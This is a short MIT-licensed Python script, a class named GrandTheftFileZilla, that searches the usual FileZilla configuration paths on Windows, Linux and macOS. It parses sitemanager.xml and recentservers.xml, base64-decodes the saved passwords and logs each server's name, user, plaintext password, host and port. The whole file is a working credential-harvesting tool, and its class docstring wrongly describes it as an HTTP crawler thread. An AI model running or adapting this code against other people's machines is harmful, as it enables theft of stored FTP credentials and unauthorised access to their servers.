# -*- coding: utf-8 -*-

# MIT License
#
# Copyright (c) 2017 Tijme Gommers
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import xml.etree.ElementTree
import logging
import base64
import sys
import os

class GrandTheftFileZilla:
    """The crawler thread executes the HTTP request using the HTTP handler.

    Attributes:
        credentials_xml_locations (obj): All possible `sitemanager.xml` or `recentservers.xml` locations.
        credentials_xml_filenames (arr): An array of possible filenames (since saved & cached servers are stored in different files).
        __credentials (arr): Contains all the credentials (if found).

    """

    credentials_xml_locations = {
        "win": [
            os.path.join(os.environ["APPDATA"] if "APPDATA" in os.environ else "", "Roaming/FileZilla/[$filename].xml"),
            os.path.join(os.environ["APPDATA"] if "APPDATA" in os.environ else "", "FileZilla/[$filename].xml"),
            os.path.join(os.environ["CSIDL_APPDATA"] if "CSIDL_APPDATA" in os.environ else "", "FileZilla/[$filename].xml")
        ],
        "linux": [
            os.path.expanduser("~") + "/.filezilla/[$filename].xml",
            os.path.expanduser("~") + "/.config/filezilla/[$filename].xml"
        ],
        "darwin": [
            os.path.expanduser("~") + "/.filezilla/[$filename].xml",
            os.path.expanduser("~") + "/.config/filezilla/[$filename].xml"
        ]
    }

    credentials_xml_filenames = [
        "sitemanager",
        "recentservers"
    ]

    def __init__(self):
        """Constructs a GrandTheftFileZilla instance."""

        self.__credentials = []

    def extract_credentials(self, location):
        """Extract credentials from the given xml location and add them to the credentials array.

        Args:
            location (str): The location/filepath of the XML file.

        """

        root = xml.etree.ElementTree.parse(location).getroot()

        if not root:
            return

        for server in root[0].findall("Server"):
            namevl = server.find("Name").text if hasattr(server.find("Name"), "text") else ""
            uservl = server.find("User").text if hasattr(server.find("User"), "text") else ""
            passvl = server.find("Pass").text if hasattr(server.find("Pass"), "text") else ""
            hostvl = server.find("Host").text if hasattr(server.find("Host"), "text") else ""
            portvl = server.find("Port").text if hasattr(server.find("Port"), "text") else ""

            passvl_str = base64.b64decode(passvl).decode("utf-8")

            self.__credentials.append((namevl, uservl, passvl_str, hostvl, portvl))

    def get_credentials(self):
        """Iterate over the correct possible XML paths and extract and return the credentials."""

        locations_found = 0

        for location_platform in self.credentials_xml_locations:
            if not sys.platform.startswith(location_platform):
                continue

            for location in self.credentials_xml_locations[location_platform]:
                for filename in self.credentials_xml_filenames:
                    parsed_location = location.replace("[$filename]", filename)

                    if os.path.exists(parsed_location):
                        locations_found += 1
                        self.extract_credentials(parsed_location)

        if not locations_found:
            logging.warning("It looks like FileZilla isn't installed since no SiteManager XML's could be found.")

        return self.__credentials

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format='[%(asctime)s][%(levelname)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )

    logging.info("Started searching for credentials stored in FileZilla.")

    credentials = GrandTheftFileZilla().get_credentials()

    if credentials:
        logging.info(str(len(credentials)) + " servers with credentials found.")
    else:
        logging.warning("No servers with credentials found.")

    for (namevl, uservl, passvl, hostvl, portvl) in credentials:
        logging.info("Server found.\n    Name: " + namevl + " \n    User: " + uservl + " \n    Pass: " + passvl + " \n    Host: " + hostvl + " \n    Port: " + portvl)

    logging.info("Finished searching.")